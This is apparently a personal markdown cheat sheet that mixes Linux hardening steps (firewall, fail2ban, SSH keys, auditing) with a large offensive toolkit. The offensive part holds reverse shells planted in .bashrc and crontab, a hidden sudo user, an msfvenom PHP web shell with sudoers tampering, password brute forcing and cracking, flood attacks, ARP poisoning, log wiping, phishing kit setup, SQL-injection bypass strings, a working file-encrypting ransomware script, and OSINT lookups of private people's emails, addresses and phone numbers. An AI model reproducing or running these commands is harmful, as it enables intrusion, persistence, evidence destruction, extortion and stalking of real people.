## Linux Security :

Linux servers are secure but desktops are vulnerable but some good rules for linux security hardening is essential. <br />
Install a firewall `$ sudo install ufw` <br />
```
 $ sudo ufw limit 22/tcp 
 $ sudo ufw allow 80/tcp 
 $ sudo ufw allow 443/tcp
 $ sudo ufw default deny incoming 
 $ sudo ufw default allow outgoing 
 $ sudo ufw enable 
 $ sudo ufw status
```
Install Fail2ban (IDS): <br />
` $ sudo apt install fail2ban` and all config files are in `/etc/fai2ban`<br />
Main files: `/etc/fail2ban/fail2ban.conf` and `/etc/fail2ban/jail.conf` <br />
Config : `/etc/fail2ban/jail.local`

```
[DEFAULT]
ignoreip = 127.0.0.1/8 ::1
bantime = 3600
findtime = 600
maxretry = 5

[sshd]
enabled = true

```

<table style="width:100%" >

<tr>
<th>topic</th>
<th>description <br /></th>
<th>command <br /></th>
</tr>

<tr>
<th> SSH Security Essentials</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Configuring SUDO Access</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Securing Apache2</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Securing Nginx</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>UFW firewall</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Secure phpMyAdmin</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Apache2 WAF</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Nginx WAF</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>Docker Security Essentials</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>

<tr>
<th>(Log4Shell) - Exploitation & Mitigation</th>
<td>y <br /></td>
<td>y <br /></td>
</tr>
</table>


### Uncover illegal access in linux systems:

```
    $ who
    $ w
    $ netstat -natu | grep 'ESTABLISHED'
    $ netstat -natu | grep 'LISTEN' (anything listening to my computer or vice versa)
    $ last (all connections)
    $ users
    $ nano /etc/passwd
    $ history ( $su username )
    $ less /home/username/.bash_history
    $ iftop -i wlan0 ( $ip a )
    $ btop
    $ lsof 
    $ apt install chkrootkit (rootkit analyzer)
    $ chkrootkit
```

### Anonymize Your Traffic With Proxychains & Tor

```
$ sudo apt install proxychains
$ sudo apt install tor (9050 port for tor service - not the browser but tor service)
$ sudo vim /etc/proxychains.conf
$ sudo systemctl enable tor.service
$ sudo systemctl start tor.service
$ proxychains firefox dnsleak.com
```

### Defend Your Ubuntu System Against Network Attacks :

Goal is to minimize the number of attack surface with ref - [blog](https://null-byte.wonderhowto.com/how-to/locking-down-linux-using-ubuntu-as-your-primary-os-part-2-network-attack-defense-0185709/)

```
$ sudo systemctl disable cups-browsed (cut down port listening)
$ sudo systemctl disable avahi-daemon (disable apple device daemons)
$ sudo ufw enable ( and apply the rules)
$ sudo ufw default deny incoming 
$ sudo ufw default deny forwarding 
$ sudo ufw default deny outgoing
$ ifconfig (check network adapter name <interface> and Cloudflare DNS 1.1.1.1)
$ sudo ufw allow out on <interface> to 1.1.1.1 proto udp port 53 comment 'allow DNS on <interface>'
$ sudo ufw allow out on <interface> to any proto tcp port 80 comment 'allow HTTP on <interface>'
$ sudo ufw allow out on <interface> to any proto tcp port 443 comment 'allow HTTPS on <interface>'
set default DNS to 1.1.1.1
$ sudo ufw default allow outgoing (default firewall rules)
$ tail -f /var/log/ufw.log
```


 ### Maintain remote access / backdoor to remote systems: 
<table style="width:100%" >



<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>maintain access</th>
<td>generate ssh key & maintain backdoor <br /></td>
<td>$ ssh-keygen -t rsa <br />
> /root/.ssh/godseye (name it godseye and put it in root) <br />
?? ls <br />
$ cat godseye <br />
$ cat godseye.pub <br />
$ ssh-copy-id -i godseye.pub user@ip <br />
$ ssh -i godseye user@ip <br />
$ sudo su <br />
$ cd .ssh/ <br />
$ ls <br />
$ cat authorized_keys <br /></td>
</tr>


<tr>
<th>ssh configuration</th>
<td>modify ssh configuration<br /></td>
<td>$ nano /etc/ssh/sshd_config (RSAAuthentication should be yes to login without password)<br /></td>
</tr>

<tr>
<th>adding a sneaky user</th>
<td>Adding a sneaky user in remote<br /></td>

<td>$ sudo su<br />
$ cd .. (go to home folder)<br />
$ ls<br />
$ useradd -m -s /bin/bash ftp<br />
$ usermod -aG sudo ftp<br />
$ passwd ftp<br />
$ ssh ftp@ip<br /></td>
</tr>

<tr>
<th>bashrc profile</th>
<td>modify ssh configuration<br /></td>
<td>$ ssh ftp@ip<br />
$ cd .. (go to home folder)<br />
$ nano user/.bashrc<br />
$ sh -i >& /dev/tcp/192.168.177.45/9000 0>&1 (put in a sneaky command)<br />
$ nc -lvp 9000 (from local system and anytime a user logs into remote we get an ip)<br />
</td>
</tr>

<tr>
<th>cron tab in remote machine</th>
<td>getting a cron tab in remote machine to get a backdoor<br /></td>
<td>
$ sudo su (in remote)<br />
$ crontab -e (type '2' for nano)<br />
$ ***** /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.177.45/9000 0>&1 (add this cronjob)<br />
$ nc -nlvp 9000 (in local use netcat and we get a connection as root #)<br />
</td>
</tr>

<tr>
<th>use metasploit to get persistence in a system</th>
<td>webshell using msfvenom<br /></td>
<td>$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.177.45 LPORT=9001 -e php/base64 -f raw shell.php (create a web shell)<br />
$ ls <br />
$ nano shell.php <br />
$ create php code and $ cat shell.php (copy the code)<br />
$ sudo su (in remote) <br />
$ cd /var/www/html/ <br />
$ ls <br />
$ nano backup.php (paste the code)<br />
$ nano /etc/sudoers (in USER PRIVILEDGES add 'www-data ALL=(ALL:ALL) ALL for web server) <br />
$ passwd www-data (www-data user got access)<br />
$ msfconsole (in local) <br />
> use  multi/handler <br />
> set payload php/meterpreter/reverse_tcp <br />
> set lhost 192.168.177.45 <br />
> set lport 9001 <br />
> run <br />
$ curl 192.168.177.48/backup.php (from local shell)<br />
We get a meterpreter shell to remote host:<br />
> whoami <br />
</td>
</tr>

</table>

### Ways to secure a linux server:


<table style="width:100%" >

<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>Enable Automatic Updates</th>
<td>Automatic updates and security patches of applications<br /></td>
<td>$ apt update<br />
$ apt dist-upgrade<br />
$ apt install unattended-upgrades<br />
$ dpkg-reconfigure --priority=low unattended-upgrades ( hit YES) <br />
</td>
</tr>

<tr>
<th>Limiting User Account</th>
<td>Avoid logging in as root<br /></td>
<td>$ adduser skk<br />
$ usermod -aG sudo skk (add skk to sudo group)<br />
$ logout <br />
$ ssh skk@ip <br />
skk$ sudo adduser saikia (we just got sudo power via skk) <br />
</td>
</tr>

<tr>
<th>Authentication Key Pair over Passwords</th>
<td>Public Key and Private Key<br /></td>
<td>$ mkdir ~/.ssh && chmod 700 ~/.ssh<br />
$ ssh-keygen -b 4096 (generating the public private key pair in localhost)<br />
$ cd .ssh<br />
$ ls <br />
$ scp $env:USERPROFILE/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys (Windows only) <br />
$ ssh-copy-id user@ip <br />
$  scp ~/.ssh/id_rsa.pub user@ip:~/.ssh/authorized_keys (linux only) <br />
</td>
</tr>

<tr>
<th>Lockdown Logins</th>
<td>no passwords across the board<br /></td>
<td>$ sudo nano /etc/ssh/sshd_config <br />
$ (change port no in the ssh config file. port 22 is used by ssh by default and we can change that by configuring the config file : remove '#'(uncomment) and in config file: <br />Port 717<br />AddressFamily inet<br />PermitRootLogin no<br />PasswordAuthentication no ) <br />
$ sudo systemctl restart sshd <br />
$ ssh user@ip -p 717 (I can login via the new port)<br />
</td>
</tr>

<tr>
<th>Firewall it up!</th>
<td>Check ports and configure firewall<br /></td>
<td>$ sudo ss -tupln<br />
$ ufw (uncomplicated firewall)<br />
$ sudo apt install ufw <br />
$ sudo ufw status <br />
$ sudo ufw allow 717 (update firewall for custom port) <br />
$ sudo ufw enable <br />
$ sudo apt install apache2 <br />
$ sudo systemctl start apache2 <br />
$ sudo ss -tupln <br />
$ ping ip -t (to check if server is up) <br />
$ sudo nano /etc/ufw/before.rules (block ping to protect servers) <br />
> edit & add in: <br />
> #ok icmp codes for INPUT <br />
> A ufw-before-input -p icmp --icmp-type echo-request -j DROP<br />
$ sudo ufw reload<br />
$ sudo reboot (server is invisible to pings now)<br />
</td>
</tr>
</table>

### OSINT (Information Gathering) from Social Media:


<table style="width:100%" >

<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>Twitter OSINT</th>
<td>twint (twitter intelligence)<br /></td>
<td>
$ apt install git <br />
$ apt install python3 <br />
$ apt install python3-pip <br />
$ git clone --depth=1 https://github.com/twintproject/twint.git <br />
$ cd twint (twint can also be imported in python)<br />
$ pip3 install . -r requirements.txt<br />
$ twint -u florist_notes<br />
$ twint -h (list all switches you can use)<br />
$ twint -u florist_notes --limit 20 (last 20 tweets)<br />
$ twint -u florist_notes -s "anime" (search through tweets)<br />
$ twint -u florist_notes -s "book" -o book.json --json (output to a file)<br />
$ twint -u 3blue1brown --min-likes 100 <br />
$ twint -u 3blue1brown --since 2021-04-28 <br />
$ twint -u 3blue1brown --year 2018 <br />
$ twint -u 3blue1brown --year 2018 --images <br />
$ twint -s coffee --near hamburg --Since 2021-04-21 --min-likes 15 (search tweets with switches)<br />
$ twint -s "sun" --since 2021-04-28 -g="53.5488, 9.9872, 20km" (lat lon radius) <br />
In Python:<br />

```python
import twint

search = input("What are you searching for?")
city = input("Where ?")

c = twint.Config()
c.Search = search
c.Near = city
c.Limit = 20
c.Populer_tweets = True

twint.run.Search(c)
```

who ever tweets at @florist_notes today:

```python
import twint
from datetime import datetime
today = datetime.now().strftime('%Y-%m-%d')
c = twint.Config()
c.To = "florist_notes"
c.Since = today
c.Hide_output = True
c.Store_object = True

twint.run.Search(c)

tweets = twint.output.tweets_list

mypeople = []

for tweet in tweets:
    mypeople.append(('{}'.format(tweet.username)))

print(mypeople)

for user in mypeople:
    c = twint.Config()
    c.Username = user
    c.Limit = 20
    twint.run.Search(c)

```
<br /></td>
</tr>

<tr>
<th>Instagram OS!NT</th>
<td>OS!NT on Instagram account<br /></td>
<td>
$ git clone https://github.com/Datalux/Osintgram <br />
$ cd Osintgram <br />
$ pip3 install -r requirements.txt<br />
$ mkdir config <br />
$ cd config <br />
$ echo "username" > username.conf (dummy username acc)<br />
$ echo "supersecretpassword" > pw.conf<br />
$ echo "{}" > settings.json <br />
In Osintgram$ :<br />
$ python3 main.py medialab <br />

We will be in Osintgram console : <br />

$ list <br />
$ stories (download stories)<br />
$ xdg-open sample.jpg (image viewer) <br />
$ fwingsemail (get emails for users followed by the target) <br />
$ addrs (get all registered addresses for target photos) <br />
<br /></td>
</tr>

<tr>
<th>NMap for network vulnerabilities</th>
<td>network vulnerabilities with nmap and nmap scripting engine - 

[NSE](https://nmap.org/book/man-nse.html). Can change speed of scanning to avoid detection.<br /></td>
<td>
$ nmap -sP 10.7.1.0/24 (number of hosts are up)<br />
$ sudo nmap -sT -p 80, 443 10.7.1.0/24  (check for open ports, usually 80 or 443 ports are oprn in web server, T = TCP Connect, <ids in firewall can detect this 3 way handshake>) <br />
$ sudo nmap -sS -p 80, 443 10.7.1.0/24 (S = stealthy, to avoid intrusion detection (IDS), no complete 3 way handshake) <br />
$ man nmap <br />
$ sudo nmap -O 10.7.1.226 (OS detection)<br />
$ sudo nmap -A 10.7.1.226 (detailed) <br />
$ sudo nmap -sS -D  10.7.1.80 10.7.1.226 (will put a decoy ip address - cover your tracks) <br />
$ sudo nmap --script vuln 10.7.1.226 (find vulnerabilities)
<br /></td>
</tr>

<tr>
<th>find info on phone numbers with PhoneInfoga</th>
<td>Find info on phone numbers<br /></td>
<td>
$ docker pull sundowndev/phoneinfoga:latest <br />
$ docker run -it sundowndev/phoneinfoga scan -n 13526006900 <br />
$ docker run -it -p 8080:8080 sundowndev/phoneinfoga serve -p 8080 (to serve web UI at port 8080) <br />
<br /></td>
</tr>

<tr>
<th>find social media accounts with Sherlock</th>
<td>sherlock<br /></td>
<td>
$ git clone https://github.com/sherlock-project/sherlock.git <br />
$ cd sherlock <br />
$ python3 -m pip install -r requirements.txt <br />
$ python3 sherlock --help <br />
$ python3 sherlock 3blue1brown <br />
$ python3 sherlock --timeout 1 3blue1brown (creates a text file of results in dir) <br />
<br /></td>
</tr>

<tr>
<th>Hide yourself</th>
<td>hide yourself with ProxyChains<br /></td>
<td>
$ locate proxychains <br />
$ sudo vi /etc/proxychains.conf (uncomment 'dynamic_chain' for dynamic proxies, change socks4 ip port or https ip port) <br />
$ proxychains firefox google.com <br />
$ proxychains nmap -sT -p 80,443 217.160.0.69 <br />
<br /></td>
</tr>

<tr>
<th>hacking with gsearch</th>
<td>Hacking with Google Search - dorking<br /></td>
<td>
> frenchpress site: starbucks.com <br />
> site:starbucks.com inurl:admin <br />
> site:starbucks.com intext:admin <br />
> site:starbucks intitle: login <br />
> site:starbucks.com filetype:pdf <br /><br />

Google Hacking Database : [GHD](https://www.exploit-db.com/google-hacking-database) <br />
$ theHarvester -d starbucks.com -b google (find emails and respective ip addresses)<br />
$ theHarvester -d starbucks.com -b netcraft (lot more information)<br />
<br /></td>
</tr>


</table>

### Hacking with Linux:


<table style="width:100%" >

<tr>
<th>command</th>
<th>description <br /></th>
<th>reference <br /></th>
</tr>

<tr>
<th>Hacking password with Hashcat</th>
<td>crack with hydra and hashcat<br /></td>
<td>
$ cd /usr/share/wordlists <br />
$ sudo gzip -d rockyou.txt.gz (14 mil passwords) <br />
$ sudo hydra -l "username" -P wordlist.txt \ (dictionary brute force attack - RockYou.txt) <br />
> 45.79.49.74 ssh (firewalls might block this)<br />
$ cat wordlist.txt (my custom wordlist) <br />
$ cat /etc/shadow (hashes - MD5, SHA 256 , NTLM etc)<br />
$ man hashcat <br />
$ sudo hashcat -a 0 -m 1000 -o crackedpass.txt \ <br />
> hashes.txt wordlist.txt  (1000 for NTLM - Windows based attacks)<br />
$ sudo hashcat -a 0 -m 1000 -o crackpass.txt \ <br />
"1CAGHKLGSGIUGS" wordlist.txt <br />
$ sudo cat crackpass.txt (output / result)<br />
<br /></td>
</tr>

<tr>
<th>Hide files on target machines</th>
<td>Steganography - hide files in windows and linux systems<br /></td>
<td>

Alternate Data Streams to hide file inside another file:<br />
$ mkdir myhiddenstuff<br />
$ cd  myhiddenstuff<br />
$ notepad supersecretfile.txt<br />
$ notepad nothingtoseehere.txt <br />
$ type supersecretfile.txt > nothingtoseehere.txt:supersecretfile.txt (this will hide supersecretfile.txt inside of nothingtoseehere.txt  with ADS)<br />
$ notepad nothingtoseehere.txt:supersecretfile.txt <br />
$ dir /r <br />
$ attrib +h filename.txt (make files hidden) <br />
<br />
$ sudo apt install steghide -y <br />
$ steghide embed -cf image.jpg -ef file.txt (to hide .txt inside .jpg)<br />
$ steghide extract -sf image.jpg <br />

<br /></td>
</tr>

<tr>
<th>DDoS from dark web</th>
<td>Distributed Denial of service & botnet<br /></td>
<td>

[tor browser](https://www.torproject.org/download/) <br />
[saphyra](https://securityintelligence.com/dissecting-hacktivists-ddos-tool-saphyra-revealed/) : http flood attack : HTTP get<br />
[low orbit ion cannon](https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon); [byob](https://github.com/malwaredllc/byob)<br />
All the DDoS scripts from [H1R0GH057/Anonymous](https://github.com/H1R0GH057/Anonymous) are also in scripts/security/[ddos](../scripts/security/ddos/)<br />

$ sudo hping3 -1 --flood 10.7.1.50 (ping as dos)<br />

ICMP Flood / ping of death : but ICMP or ping response can be disabled.<br />

$ sudo hping3 -d 200 -p 80 -S --flood 10.7.1.50 (from multiple servers)<br />
$ python saphyra.py http://10.7.1.50 <br />
<br /></td>
</tr>

<tr>
<th>SNiFF network traffic (MiTM attack)</th>
<td>any device network traffic<br /></td>
<td>
use wireshark <br />
ARP Poisoning with ettercap: (Man in the middle and then wireshark)<br />
$ apt install wireshark <br />
$ apt install nmap <br />
$ apt install ettercap-text-only <br />
$ sudo nmap -sn 10.0.0.0/24 (start scanning the network for ip addresses of devices) <br />
$ sudo ettercap -T -S i wlan0 -M arp:remote /10.0.0.1// /10.0.0.129//(S = SSL, 10.0.0.1 is router and 10.0.0.129 is the target, then use wireshark to sniff ) <br />
In wireshark: ip.addr == 10.0.0.129 <br />
ip.addr == 10.0.0.129 && http (to filter no SSL cert destination ip from target device) <br />
Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
<br /></td>
</tr>

<tr>
<th>Build a Hacking Lab</th>
<td>Safe and secure environment<br /></td>
<td>

> Hacking Machine - Kali <br />
> Vulnerable Webapp machine - VULNHUB :
 
 [Mr Robot VULNHUB OVA](https://www.vulnhub.com/entry/mr-robot-1,151/) <br />
> Modify network settings <br />
> DHCP server <br />
> cd /Program Files/Oracle/VirtualBox (In windoows)<br />
>  >vboxmanage dhcpserver add --network=networkname --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable<br />
<br /></td>
</tr>


<tr>
<th>Haunt a Computer Using SSH</th>
<td>haunt via ssh<br /></td>
<td>
$ export DISPLAY=:0.0 (let DISPLAY of remote be open)<br />
$ xterm <br />
$ sudo modprobe pcspkrc (play sound in speaker) <br />
$ say "404 : hacked !" <br />
$ espeak "time is running :)" <br />
$ sudo apt install beep <br />
$ beep -f 4000 -D 500 -l 100 -r 10 (beep warning) <br />
$ crontab -l <br />
$ crontab -e <br />
 uncomment  * * * * * beep .... <br />
$ sudo xterm -maximize -e sudo tcpdump <br />
$ for i in {1..10}; do sudo xterm -maximize -e sudo tcpdump; done <br />
(create a `$tcpdump` window reappearing 10 times on being closed.) <br />
$ cat warning.txt (warnings) <br />
xterm -maximized -fullscreen -fa 'Monospace' -fs 19.31 -e whiptail --title "CRITICAL: ACTION CANNOT BE UNDONE" --msgbox "UNAUTHORIZED LOGIN! DATA SAFEGUARD SYSTEM WILL DESTROY THIS TERMINAL IN 10 SECONDS, STAY 30 FEET CLEAR TO AVOID BLAST" --topleft 23 79 <br /><br />
$ for i in {1..10}; do firefox -new-window "hhtp://www.saikia.one/" ; done <br />
<br /></td>
</tr>

<tr>
<th>Clear the Logs & History on Linux Systems to Delete All Traces</th>
<td>clear logs and history<br /></td>
<td>

```bash

$ find / -perm -222 -type d 2>/dev/user (all dir with write permission)
$ mkdir /dev/shm/.secret
$ ls /dev/shm
$ cd /dev/shm/.secret/
$ nano logs.txt
$ rm -rf /dev/shm/.secret
$ cd /var/log/ (all log files)
$ sudo rm auth.log
$ wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
$ chmod +x covermyass
$ ./covermyass
$ shred --help (delete file data permanently which cannot be recovered)
$ shred -vfzu auth.log ( shred over rm )
$ sudo rm kernel.log ( or edit )
$ cd -vfzu /home/username/.bash_history
$ >.bash_history (it will clear the file)

```
<br /></td>
</tr>

<tr>
<th>Audit & Lock Down Your System</th>
<td>with lynis<br /></td>
<td>

```bash
$ sudo wget 'https://github.com/CISOfy/lynis/archive/master.zip'
$ sudo unzip
$ cd lynis-master
$ sudo chmod +x lynis
$ sudo ./lynis audit system
$ sudo apt-get install clamav
$ sudo clamscan -r / --log=mp/clamav_report.log (complete scan of system - all file)
$ sudo clamscan -ir malware

opensnitch:
$ sudo apt install protobuf-compiler libpcap-dev libnetfilter-queue-dev python3-pip golang git go-dep
$ go get github.com/golang/protobuf/protoc-gen-go (step 3)
$ python3 -m pip install --user grpcio-tools (step 1)
$ go get github.com/evilsocket/opensnitch (step 2)
$ echo 'export GOPATH=$HOME/go' >> ~/.bashrc
$ source ~/.bashrc
$ make
$ sudo make install
$ sudo systemctl enable opensnitchd
system logs:
$ find /var/log/ -type f \( -name "*.log" \) -exec tail -f "$file" {} +

```

<br /></td>
</tr>


<tr>
<th>reverse shells with netcat</th>
<td>how to get remote access to your hacking targets<br /></td>
<td>

$ nc -lnvp 87 -s source_ip (l=listening for a connection, n= no dns, only ip; v=verbose, p=port) <br />
In the target machine (both machines must have netcat-nc): <br />
$ nc -e /bin/bash source_ip 87 (port 87) <br />
We want the above script to be installed in the machine and executed.<br />
In windows: using [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) <br />
(server side) $ stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 69.164.204.158 <br />

(client side) $ command [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)<br />
<br /></td>
</tr>

<tr>
<th>Phishing attacks</th>
<td>

phishing website and emails with [blackeye](https://github.com/An0nUD4Y/blackeye)<br /></td>
<td>

$ git clone https://github.com/An0nUD4Y/blackeye <br />
$ sudo ./blackeye.sh (setup [ngrok](https://ngrok.com/) with auth token )<br />
Spear Phishing Attack: use SET (Social Engineering Toolkit):<br />
(put malware - mess host file: DNS Poisoning)

<br /></td>
</tr>


<tr>
<th>put a DARK WEB website on a Raspberry Pi!!</th>
<td>host a dark web website<br /></td>
<td>
overlay tor onion relays & routing helps keep anonymity to get to your dark web website, we meet in the middle. <br />
Brave Browser : New Private Window with Tor <br />
Install nginx, tor: <br />
$ sudo apt install tor <br />
$ sudo nano /etc/tor/torrc <br />
Uncomment HiddenServiceDir and HiddenServicePort <br />
$ sudo service tor stop <br />
$ sudo service tor start <br />
$ sudo service tor status <br />
$ sudo cat /var/lib/tor/hidden_service/hostname (this is my dark web address) <br />
$ sudo apt install nginx <br />
$ sudo service nginx start <br />
$ sudo nano /etc/nginx/nginx.conf <br />
Uncomment : server_tokens off; server_name_in_redirect off; <br />
just under server_tokens off: write : port_in_redirect off; <br />
$ sudo service nginx restart <br />
$ cd /var/www <br />
$ cd html <br />
$ ls <br />
$ sudo nano index.html (remove the original html) <br />
edit the html <br />
$ sudo service nginx restart <br />

<br /></td>
</tr>

<tr>
<th>Hack Web Browser</th>
<td>Hacking Web Browser with BeEF<br /></td>
<td>
$ cat /root/beef.info (copy beef server address and open in browser) <br />
<br /></td>
</tr>

<tr>
<th>SQL Injections</th>
<td>run database against logins<br /></td>
<td>
SELECT * FROM users WHERE username = 'admin' AND password='pass' <br />
<br />
use admin' as username, so username = ' admin' ', if syntax error = SQL Inj vuln <br />
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password='pass' ( first reads AND then OR ) <br /><br />
username : admin' OR '1'='1 ; password: password123 <br />
<br />
username  :  admin'-- <br />
SELECT * FROM users WHERE username ='admin'-- 'AND password='password123' <br />
-- is comment and ignore the rest section after it in SQL injection attacks. <br />
<br /></td>
</tr>

<tr>
<th>create malware</th>
<td>

ransomware, worms, trojan, adware, spyware with [malware showcase](https://github.com/PatrikH0lop/malware_showcase), [MalwareSourceCode](https://github.com/vxunderground/MalwareSourceCode), [theZoo - A Live Malware Repository](https://github.com/ytisf/theZoo), [Malware Database](https://github.com/Endermanch/MalwareDatabase)<br /></td>
<td>
$ mkdir ransomware <br />
$ cd ransomware (encrypt the following files)<br />
$ echo "this is a file" > file.txt <br />
$ echo "leave me alone" > file2.txt <br />
$ echo "another one" > hey.txt <br />
$ echo "one more" > pleasedonthurtme.txt <br />
$ nano ransom.py <br />
<br />

encryption script:<br />
```python
    #!/usr/bin/env python3
    import os
    from cryptography.fernet import Fernet


    files = []

    for file in os.listdir():
        if file == "ransom.py" or file=="thekey.key" or file=="decrypt.py":
            continue
        if os.path.isfile(file):    
            files.append(file) 

    print(files)

    key = Fernet.generate_key()

    with open("thekey.key", "wb") as thekey:
        thekey.write(key)

    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

    print(key)

```
decryption script:

```python
.
.
.
print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "coffee"
user_phraase = input("Enter the secret phrase to decrypt\n")

if user_phraase == secretphrase:
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print("congrats, your files are decrypted")
else:
    print("sorry, wrong secret phrase. you have 17:00 hrs left.")

```

$ git clone https://github.com/PatrikH0lop/malware_showcase <br />
$ pip3 install .r requirements.txt  <br />


<br /></td>
</tr>

</table>